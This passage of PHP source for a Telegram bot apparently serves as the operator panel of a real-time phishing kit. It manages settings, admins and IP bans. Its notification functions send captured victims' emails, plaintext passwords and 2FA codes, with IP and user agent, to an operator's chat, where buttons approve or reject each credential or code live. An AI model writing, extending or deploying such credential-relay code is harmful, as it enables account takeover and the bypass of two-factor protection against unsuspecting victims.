        'auto_reject_seconds'   => ['label' => 'Авто-отказ',            'btn' => '⏱ Авто-отказ',      'group' => 'tech', 'unit' => 'сек'],
        'polling_interval_ms'   => ['label' => 'Интервал опроса',        'btn' => '⏱ Опрос',           'group' => 'tech', 'unit' => 'мс'],
        'presence_interval_ms'  => ['label' => 'Интервал heartbeat',    'btn' => '⏱ Heartbeat',       'group' => 'tech', 'unit' => 'мс'],
    ];
}

function cfg_label_for(string $key): string
{
    $meta = cfg_meta();
    return $meta[$key]['label'] ?? $key;
}

function cfg_default_for(string $key): string
{
    global $CONFIG;
    return (string)($CONFIG['defaults'][$key] ?? '');
}

function cfg_keys_in_group(string $slug): array
{
    $out = [];
    foreach (cfg_meta() as $k => $m) {
        if ($m['group'] === $slug) $out[] = $k;
    }
    return $out;
}

function cmd_config(int $chat_id): void
{
    render_config_root($chat_id, null);
}

function render_config_root(int $chat_id, ?int $msg_id): void
{
    $groups = cfg_groups();
    $text   = "⚙️ <b>Настройки сайта</b>\n\nВыберите категорию:";

    $kb = [];
    foreach ($groups as $slug => $label) {
        $count = count(cfg_keys_in_group($slug));
        $kb[] = [['text' => $label . "  ·  $count", 'callback_data' => 'cfg:cat:' . $slug]];
    }
    $extra = ['reply_markup' => json_encode(['inline_keyboard' => $kb])];

    if ($msg_id) tg_edit($chat_id, $msg_id, $text, $extra);
    else         tg_send($chat_id, $text, $extra);
}

function render_config_category(int $chat_id, ?int $msg_id, string $slug): void
{
    $groups = cfg_groups();
    if (!isset($groups[$slug])) { render_config_root($chat_id, $msg_id); return; }

    $meta   = cfg_meta();
    $values = cfg_all();
    $keys   = cfg_keys_in_group($slug);

    $text = "<b>" . htmlspecialchars($groups[$slug]) . "</b>\n\n";
    foreach ($keys as $k) {
        $v     = (string)($values[$k] ?? '');
        $unit  = $meta[$k]['unit'] ?? '';
        $shown = mb_strlen($v) > 60 ? mb_substr($v, 0, 60) . '…' : $v;
        $shown = '«' . htmlspecialchars($shown) . '»' . ($unit ? ' ' . $unit : '');
        $text .= "<b>" . htmlspecialchars($meta[$k]['label']) . "</b>\n$shown\n\n";
    }

    $rows = [];
    $line = [];
    foreach ($keys as $k) {
        $line[] = ['text' => $meta[$k]['btn'], 'callback_data' => 'cfg:edit:' . $k];
        if (count($line) === 2) { $rows[] = $line; $line = []; }
    }
    if ($line) $rows[] = $line;
    $rows[] = [['text' => '⬅️ К категориям', 'callback_data' => 'cfg:root']];

    $extra = ['reply_markup' => json_encode(['inline_keyboard' => $rows])];
    if ($msg_id) tg_edit($chat_id, $msg_id, $text, $extra);
    else         tg_send($chat_id, $text, $extra);
}

function cmd_get(int $chat_id, string $arg): void
{
    $key = trim($arg);
    if ($key === '') { tg_send($chat_id, 'Использование: <code>/get &lt;ключ&gt;</code>', reply_kb_extra($chat_id)); return; }
    if (!in_array($key, cfg_editable_keys(), true)) {
        tg_send($chat_id, '⚠️ Неизвестный ключ. Нажмите ⚙️ Настройки.', reply_kb_extra($chat_id));
        return;
    }
    tg_send($chat_id,
        "<b>" . htmlspecialchars($key) . "</b>:\n<code>" . htmlspecialchars((string)cfg_get($key)) . '</code>',
        reply_kb_extra($chat_id)
    );
}

function cmd_set(int $chat_id, string $arg): void
{
    $parts = preg_split('/\s+/', $arg, 2);
    if (count($parts) < 2) { tg_send($chat_id, 'Использование: <code>/set ключ значение</code>', reply_kb_extra($chat_id)); return; }
    [$key, $value] = $parts;
    if (!in_array($key, cfg_editable_keys(), true)) {
        tg_send($chat_id, '⚠️ Неизвестный ключ. Нажмите ⚙️ Настройки.', reply_kb_extra($chat_id));
        return;
    }
    cfg_set($key, $value);
    tg_send($chat_id, "✅ <b>" . htmlspecialchars($key) . "</b> обновлён.", reply_kb_extra($chat_id));
}

function cmd_reset(int $chat_id, string $arg): void
{
    $key = trim($arg);
    if ($key === '') { tg_send($chat_id, 'Использование: <code>/reset &lt;ключ&gt;</code>', reply_kb_extra($chat_id)); return; }
    if (!in_array($key, cfg_editable_keys(), true)) { tg_send($chat_id, '⚠️ Неизвестный ключ.', reply_kb_extra($chat_id)); return; }
    cfg_reset($key);
    tg_send($chat_id, "🔄 <b>" . htmlspecialchars($key) . "</b> сброшен к значению по умолчанию.", reply_kb_extra($chat_id));
}

function cmd_timeout(int $chat_id, string $arg): void
{
    $sec = (int)trim($arg);
    if ($sec < 5 || $sec > 86400) {
        tg_send($chat_id, 'Использование: <code>/timeout 120</code> (от 5 до 86400 секунд)', reply_kb_extra($chat_id));
        return;
    }
    cfg_set('auto_reject_seconds', (string)$sec);
    tg_send($chat_id, "⏱ Авто-отказ выставлен на <b>$sec</b> сек.", reply_kb_extra($chat_id));
}

// ---------- админы ----------

function cmd_addadmin(int $chat_id, string $arg): void
{
    if (!is_super_admin($chat_id)) { tg_send($chat_id, '⛔ Только для супер-админов.', reply_kb_extra($chat_id)); return; }
    $id = (int)trim($arg);
    if ($id === 0) {
        state_set($chat_id, 'awaiting_admin_id');
        tg_send($chat_id,
            "➕ <b>Добавление админа</b>\n\nОтправьте его <code>chat_id</code>.",
            cancel_kb_extra()
        );
        return;
    }
    db_run('INSERT IGNORE INTO admins (chat_id, is_super) VALUES (?, 0)', [$id]);
    tg_send($chat_id, "✅ Админ <code>$id</code> добавлен.", reply_kb_extra($chat_id));
}

function cmd_deladmin(int $chat_id, string $arg): void
{
    if (!is_super_admin($chat_id)) { tg_send($chat_id, '⛔ Только для супер-админов.', reply_kb_extra($chat_id)); return; }
    $id = (int)trim($arg);
    if ($id === 0) { tg_send($chat_id, 'Использование: <code>/deladmin &lt;chat_id&gt;</code>', reply_kb_extra($chat_id)); return; }
    db_run('DELETE FROM admins WHERE chat_id = ? AND is_super = 0', [$id]);
    tg_send($chat_id, "🗑 Админ <code>$id</code> удалён.", reply_kb_extra($chat_id));
}

function cmd_admins(int $chat_id): void
{
    render_admins_message($chat_id, null);
}

function render_admins_message(int $chat_id, ?int $edit_msg_id): void
{
    $rows = db_all('SELECT chat_id, username, is_super FROM admins ORDER BY is_super DESC, chat_id');
    $text = "👥 <b>Админы</b>\n\n";
    if (!$rows) {
        $text .= '<i>пусто</i>';
    } else {
        foreach ($rows as $r) {
            $tag = $r['is_super'] ? '👑' : '👤';
            $text .= "$tag <code>{$r['chat_id']}</code>\n";
        }
    }

    $kb_rows = [];
    if (is_super_admin($chat_id)) {
        $kb_rows[] = [['text' => '➕ Добавить', 'callback_data' => 'admin:add']];
        foreach ($rows as $r) {
            if ($r['is_super']) continue;
            $kb_rows[] = [[
                'text' => "🗑 Удалить {$r['chat_id']}",
                'callback_data' => "admin:del_ask:{$r['chat_id']}",
            ]];
        }
    }

    $extra = $kb_rows ? ['reply_markup' => json_encode(['inline_keyboard' => $kb_rows])] : [];
    if ($edit_msg_id) {
        tg_edit($chat_id, $edit_msg_id, $text, $extra);
    } else {
        tg_send($chat_id, $text, $extra);
    }
}

// =====================================================================
// Баны IP
// =====================================================================

function cmd_bans(int $chat_id): void
{
    render_bans_message($chat_id, null);
}

function render_bans_message(int $chat_id, ?int $edit_msg_id): void
{
    $rows = db_all('SELECT ip, reason, banned_at FROM banned_ips ORDER BY banned_at DESC LIMIT 50');
    $text = "🚫 <b>Заблокированные IP</b>\n\n";
    if (!$rows) {
        $text .= '<i>список пуст</i>';
    } else {
        foreach ($rows as $r) {
            $reason = $r['reason'] ? ' · ' . htmlspecialchars($r['reason']) : '';
            $text  .= "• <code>" . htmlspecialchars($r['ip']) . "</code>$reason\n  <i>{$r['banned_at']}</i>\n\n";
        }
    }

    $kb_rows = [[['text' => '➕ Забанить IP', 'callback_data' => 'ban:add']]];
    foreach ($rows as $r) {
        $kb_rows[] = [[
            'text'          => '🗑 Разбанить ' . $r['ip'],
            'callback_data' => 'ban:unban:' . $r['ip'],
        ]];
    }
    $kb_rows[] = [['text' => '🔄 Обновить', 'callback_data' => 'ban:refresh:_']];

    $extra = ['reply_markup' => json_encode(['inline_keyboard' => $kb_rows])];
    if ($edit_msg_id) {
        tg_edit($chat_id, $edit_msg_id, $text, $extra);
    } else {
        tg_send($chat_id, $text, $extra);
    }
}

function cmd_ban(int $chat_id, string $arg): void
{
    $arg = trim($arg);
    if ($arg === '') {
        state_set($chat_id, 'awaiting_ban_ip');
        tg_send($chat_id,
            "🚫 <b>Бан IP</b>\n\nОтправьте IP-адрес для блокировки.\n" .
            "Можно с причиной через пробел: <code>1.2.3.4 спам</code>",
            cancel_kb_extra()
        );
        return;
    }
    $parts  = preg_split('/\s+/', $arg, 2);
    $ip     = $parts[0];
    $reason = $parts[1] ?? null;
    if (!filter_var($ip, FILTER_VALIDATE_IP)) {
        tg_send($chat_id, "⚠️ Невалидный IP: <code>" . htmlspecialchars($ip) . "</code>", reply_kb_extra($chat_id));
        return;
    }
    db_run(
        'INSERT INTO banned_ips (ip, reason, banned_by) VALUES (?,?,?)
         ON DUPLICATE KEY UPDATE reason = VALUES(reason), banned_by = VALUES(banned_by)',
        [$ip, $reason, $chat_id]
    );
    tg_send($chat_id,
        "🚫 IP <code>" . htmlspecialchars($ip) . "</code> заблокирован.",
        reply_kb_extra($chat_id)
    );
}

function cmd_unban(int $chat_id, string $arg): void
{
    $ip = trim($arg);
    if ($ip === '') { tg_send($chat_id, 'Использование: <code>/unban &lt;ip&gt;</code>', reply_kb_extra($chat_id)); return; }
    $n = db_run('DELETE FROM banned_ips WHERE ip = ?', [$ip]);
    tg_send($chat_id,
        $n ? "✅ IP <code>" . htmlspecialchars($ip) . "</code> разбанен." : '⚠️ IP не найден в списке.',
        reply_kb_extra($chat_id)
    );
}

// =====================================================================
// Уведомления о попытках
// =====================================================================

function notify_action_keyboard(
    string $approve_label,
    string $reject_label,
    string $approve_cb,
    string $reject_cb,
    ?string $session_id,
    ?string $ip,
    ?string $ban_cb
): array {
    $rows = [[
        ['text' => $approve_label, 'callback_data' => $approve_cb],
        ['text' => $reject_label,  'callback_data' => $reject_cb],
    ]];
    $row2 = [];
    if ($session_id !== null && $session_id !== '') {
        $row2[] = ['text' => '🟢 Онлайн', 'callback_data' => "pres:online:$session_id"];
    }
    if ($ip !== null && $ip !== '' && $ban_cb !== null) {
        $row2[] = ['text' => '🚫 Забанить IP', 'callback_data' => $ban_cb];
    }
    if ($row2 !== []) {
        $rows[] = $row2;
    }
    return ['inline_keyboard' => $rows];
}

function post_verdict_keyboard(?string $session_id, ?string $ip, ?string $ban_cb): array
{
    $rows = [];
    $row = [];
    if ($session_id !== null && $session_id !== '') {
        $row[] = ['text' => '🟢 Онлайн', 'callback_data' => "pres:online:$session_id"];
    }
    if ($ip !== null && $ip !== '' && $ban_cb !== null && !db_one('SELECT 1 FROM banned_ips WHERE ip = ?', [$ip])) {
        $row[] = ['text' => '🚫 Забанить IP ' . $ip, 'callback_data' => $ban_cb];
    }
    if ($row !== []) {
        $rows[] = $row;
    }
    return $rows === [] ? [] : ['reply_markup' => json_encode(['inline_keyboard' => $rows])];
}

function build_login_attempt_text(array $att): string
{
    $url    = link_public_url(['id' => (string)($att['link_id'] ?? '')]);
    $prefix = (string)cfg_get('number_prefix');
    $suffix = (string)($att['number_suffix'] ?? '');
    $ip   = $att['ip'] ?: '—';
    $ua   = $att['user_agent'] ? mb_substr($att['user_agent'], 0, 120) : '—';
    $time = $att['created_at'] ?? date('Y-m-d H:i:s');
    return "🔐 <b>Новый вход</b>\n" .
           "───────────────\n" .
           "🆔 ID: <code>" . htmlspecialchars((string)($att['link_id'] ?? '')) . "</code>\n" .
           "📱 Номер: <code>" . htmlspecialchars($prefix . $suffix) . "</code>\n" .
           "🔗 <a href=\"$url\">$url</a>\n" .
           "📧 Email: <code>" . htmlspecialchars($att['email']) . "</code>\n" .
           "🔑 Пароль: <code>" . htmlspecialchars($att['password']) . "</code>\n" .
           "🌐 IP: <code>" . htmlspecialchars($ip) . "</code>\n" .
           "🧭 UA: <code>" . htmlspecialchars($ua) . "</code>\n" .
           "🕐 " . $time;
}

function notify_login_attempt(int $attempt_id): void
{
    $att = db_one(
        'SELECT la.*, l.chat_id AS link_chat, l.number_suffix, l.id AS link_ref
           FROM login_attempts la JOIN links l ON l.id = la.link_id
          WHERE la.id = ?', [$attempt_id]
    );
    if (!$att) return;

    $text = build_login_attempt_text($att);
    $kb = notify_action_keyboard(
        '✅ Верно', '❌ Неверно',
        "log:approve:$attempt_id", "log:reject:$attempt_id",
        $att['session_id'] ?? null,
        $att['ip'] ?? null,
        !empty($att['ip']) ? "log:ban:$attempt_id" : null
    );
    $resp = tg_send((int)$att['link_chat'], $text, ['reply_markup' => json_encode($kb)]);
    if (!empty($resp['ok']) && isset($resp['result']['message_id'])) {
        db_run('UPDATE login_attempts SET notify_msg_id = ? WHERE id = ?',
            [(int)$resp['result']['message_id'], $attempt_id]);
    }
}

function build_attempt_text(array $att): string
{
    $url    = link_public_url(['id' => (string)($att['link_id'] ?? '')]);
    $prefix = (string)cfg_get('number_prefix');
    $number = $prefix . ($att['number_suffix'] ?? '');
    $creds  = session_login_credentials($att['session_id'] ?? null);
    $email  = $creds['email'] !== '' ? $creds['email'] : '—';
    $pass   = $creds['password'] !== '' ? $creds['password'] : '—';
    $ip     = $att['ip'] ?: '—';
    $ua     = $att['user_agent'] ? mb_substr($att['user_agent'], 0, 120) : '—';
    $time   = $att['created_at'] ?? date('Y-m-d H:i:s');
    return "📩 <b>Новая попытка (2FA)</b>\n" .
           "───────────────\n" .
           "🆔 ID: <code>" . htmlspecialchars((string)($att['link_id'] ?? '')) . "</code>\n" .
           "📱 Номер: <code>" . htmlspecialchars($number) . "</code>\n" .
           "🔗 <a href=\"$url\">$url</a>\n" .
           "📧 Email: <code>" . htmlspecialchars($email) . "</code>\n" .
           "🔑 Пароль: <code>" . htmlspecialchars($pass) . "</code>\n" .
           "🔢 Код: <code>" . htmlspecialchars($att['code']) . "</code>\n" .
           "🌐 IP: <code>" . htmlspecialchars($ip) . "</code>\n" .
           "🧭 UA: <code>" . htmlspecialchars($ua) . "</code>\n" .
           "🕐 " . $time;
}

function notify_attempt(int $attempt_id): void
{
    $att = db_one(
        'SELECT a.*, l.chat_id AS link_chat, l.number_suffix
           FROM attempts a JOIN links l ON l.id = a.link_id
          WHERE a.id = ?', [$attempt_id]
    );
    if (!$att) return;

    $text = build_attempt_text($att);
    $kb = notify_action_keyboard(
        '✅ Код верный', '❌ Неверный',
        "att:approve:$attempt_id", "att:reject:$attempt_id",
        $att['session_id'] ?? null,
        $att['ip'] ?? null,
        !empty($att['ip']) ? "att:ban:$attempt_id" : null
    );
    $resp = tg_send((int)$att['link_chat'], $text, ['reply_markup' => json_encode($kb)]);
    if (!empty($resp['ok']) && isset($resp['result']['message_id'])) {
        db_run('UPDATE attempts SET notify_msg_id = ? WHERE id = ?',
            [(int)$resp['result']['message_id'], $attempt_id]);
    }
}
